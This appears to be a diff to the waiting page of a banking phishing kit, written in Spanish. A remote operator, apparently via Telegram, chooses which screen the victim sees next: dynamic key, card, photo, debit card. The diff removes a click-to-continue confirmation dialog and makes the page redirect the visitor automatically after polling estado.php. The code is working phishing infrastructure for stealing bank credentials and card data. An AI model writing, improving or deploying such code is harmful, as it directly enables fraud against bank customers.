@@ -53,52 +53,6 @@
       border-radius: 10px;
     }
 
-    .confirmRedirectZone {
-    display: none;
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background: rgba(255, 238, 160, 0.98);
-    color: #000;
-    padding: 20px 24px;
-    border-radius: 14px;
-    box-shadow: 0 12px 30px rgba(0,0,0,0.4);
-    border: 3px solid #cda617;
-    width: 92%;
-    max-width: 420px;
-    z-index: 999990;
-    text-align: center;
-    font-family: Arial, sans-serif;
-  }
-  .confirmRedirectZone h3 {
-    margin: 0 0 8px 0;
-    color: #111;
-    font-size: 18px;
-  }
-  .confirmRedirectZone p { margin: 6px 0 14px 0; font-size: 13px; color:#222; }
-  .confirmRedirectZone button.go {
-    background: #fdda24;
-    border: 0;
-    padding: 14px 18px;
-    width: 100%;
-    color: #000;
-    font-weight: bold;
-    font-size: 16px;
-    border-radius: 999px;
-    cursor: pointer;
-    box-shadow: 0 6px 14px rgba(205,166,23,0.4);
-  }
-  .confirmRedirectZone button.cancel {
-    background: #e9e9e9;
-    border: 0;
-    padding: 10px 14px;
-    margin-top: 8px;
-    width: 100%;
-    color: #444;
-    border-radius: 999px;
-    cursor: pointer;
-  }
   #debugOverlay {
       position: fixed;
       bottom: 0; left: 0; right: 0;
@@ -147,13 +101,6 @@
   <img style="margin-top: -150px;" src="img/cargando1.gif" width="85%" alt="">
 </center>
 
-<div id="confirmRedirect" class="confirmRedirectZone" role="dialog" aria-live="assertive">
-  <h3 id="confirmTitle">Operador solicitó acción</h3>
-  <p id="confirmSub">Pulsa el botón continuar para ir a la pantalla correspondiente.</p>
-  <button class="go" id="confirmGoBtn">👉 CONTINUAR</button>
-  <button class="cancel" id="confirmCancelBtn">Cancelar (esperar)</button>
-</div>
-
 <div id="debugOverlay">
   <h4>
     <span>🔍 ESTADO POLLING (visible debug)</span>
@@ -169,65 +116,7 @@
 
   let estadoAnterior = null;
   let coincidenciasSeguidas = 0;
-
-  const confirmDiv = document.getElementById('confirmRedirect');
-  const confirmTitle = document.getElementById('confirmTitle');
-  const confirmSub = document.getElementById('confirmSub');
-  const confirmGoBtn = document.getElementById('confirmGoBtn');
-  const confirmCancelBtn = document.getElementById('confirmCancelBtn');
-
-  // BLOQUEO 100%: NO HAY location.href AUTOMATICO EN NINGUN LUGAR.
-  // Solo esta variable guarda la URL pendiente, y solo se ejecuta AL CLICK en confirmGoBtn.
-  let pendingUrl = null;
-  let pendingEstado = null;
-  let mostrandoConfirm = false;
-
-  function hideConfirm() {
-    mostrandoConfirm = false;
-    confirmDiv.style.display = 'none';
-    pendingUrl = null;
-    pendingEstado = null;
-  }
-  function showConfirmFor(estado, url) {
-    if (mostrandoConfirm) return; // No re-abrir
-    mostrandoConfirm = true;
-    pendingUrl = url;
-    pendingEstado = estado;
-    const lbl = {
-      'opcion_1':  'Clave Dinámica (DINÁMICA)',
-      'opcion_2':  'Tarjeta',
-      'opcion_3':  'Error 3',
-      'opcion_4':  'Error 4',
-      'opcion_5':  'Foto',
-      'opcion_6':  'Tarjeta Débito',
-      'opcion_7':  'Opción 7',
-      'opcion_8':  'Opción 8',
-      'opcion_55': 'Opción 55',
-      'opcion_9':  'Error Dinámica',
-      'opcion_10': 'Finalizar',
-    }[estado] || estado;
-    confirmTitle.textContent = `Siguiente paso: ${lbl}`;
-    confirmSub.textContent = `Estado confirmado 2 veces: ${estado}.\nSolo pulsa CONTINUAR si realmente quieres ir a esta pantalla.\nDestino: ${url}`;
-    confirmGoBtn.textContent = `👉 CONTINUAR A ${lbl.toUpperCase()}`;
-    confirmDiv.style.display = 'block';
-  }
-
-  confirmCancelBtn.addEventListener('click', () => {
-    hideConfirm();
-    // Reiniciar estado de polling para no volver a mostrar el mismo instante después.
-    estadoAnterior = null;
-    coincidenciasSeguidas = 0;
-    addLine('Usuario canceló la acción. Esperando nuevo estado...', 'info');
-  });
-
-  confirmGoBtn.addEventListener('click', () => {
-    const url = pendingUrl;
-    const est = pendingEstado;
-    if (!url) { hideConfirm(); return; }
-    addLine(`USUARIO PULSÓ CONTINUAR => navegando a ${url} (estado=${est})`, 'redirect');
-    // La UNICA LINEA DE NAVEGACION DE TODO ESTE ARCHIVO:
-    window.location.href = url;
-  });
+  let yaRedirigiendo = false;
 
   const logEl = document.getElementById('debugLog');
   function addLine(text, cls = 'info') {
@@ -241,7 +130,7 @@
     console.log(`[espera] ${div.textContent}`);
   }
 
-  addLine(`rid=${requestId || '(null)'}  key=${key || '(null)'}`);
+  addLine(`Loader visible y activo. Esperando estado del operador. rid=${requestId || '(null)'}  key=${key || '(null)'}`);
 
   function urlPara(estado) {
     switch (estado) {
@@ -260,13 +149,8 @@
     }
   }
 
-  // Cualquier otro intento de redirección de navegador (meta refresh, extensiones, etc)
-  // se detecta con beforeunload y se loguea, pero NO se puede parar todo.
-  window.addEventListener('beforeunload', () => {
-    addLine('beforeunload detectado (la pagina se va)', 'redirect');
-  });
-
   setInterval(() => {
+    if (yaRedirigiendo) return;
     fetch(
       `estado.php?rid=${encodeURIComponent(requestId)}` +
       (key ? (`&key=${encodeURIComponent(key)}`) : ''),
@@ -275,10 +159,6 @@
       .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
       .then(data => {
         const estado = (data && typeof data.estado === 'string') ? data.estado : 'pendiente';
-
-        if (mostrandoConfirm) {
-          return; // Ya hay acción pendiente de click del usuario; no tocar.
-        }
 
         if (estado === 'pendiente') {
           estadoAnterior = 'pendiente';
@@ -289,17 +169,21 @@
         if (estadoAnterior && estadoAnterior === estado) coincidenciasSeguidas += 1;
         else { estadoAnterior = estado; coincidenciasSeguidas = 1; }
 
-        addLine(`estado=${estado} (x${coincidenciasSeguidas})` +
-          (coincidenciasSeguidas >= 2 ? ' => 2x OK, mostrando confirmación al usuario.' : ''),
-          coincidenciasSeguidas >= 2 ? 'confirmado' : 'candidato');
+        addLine(
+          `estado=${estado} (x${coincidenciasSeguidas})` +
+            (coincidenciasSeguidas >= 2 ? ' => 2x OK, redirigiendo...' : ''),
+          coincidenciasSeguidas >= 2 ? 'confirmado' : 'candidato'
+        );
 
         if (coincidenciasSeguidas >= 2) {
           const urlGo = urlPara(estado);
-          if (urlGo) {
-            // MUESTRA BOTÓN AL USUARIO, NO NAVEGA AUTOMATICAMENTE.
-            showConfirmFor(estado, urlGo);
-          } else {
-            addLine(`Estado ${estado} no mapeado (ignorado).`, 'info');
+          if (urlGo && !yaRedirigiendo) {
+            yaRedirigiendo = true;
+            addLine(`NAVEGACION AUTOMATICA (operador pulsó botón Telegram) => ${urlGo}`, 'redirect');
+            // eslint-disable-next-line no-console
+            console.log(`[espera] ✅ 2x confirmado ${estado} => location.href = ${urlGo}`);
+            // Loader sigue visible hasta el ultimo momento antes del salto.
+            setTimeout(() => { window.location.href = urlGo; }, 500);
           }
         }
       })
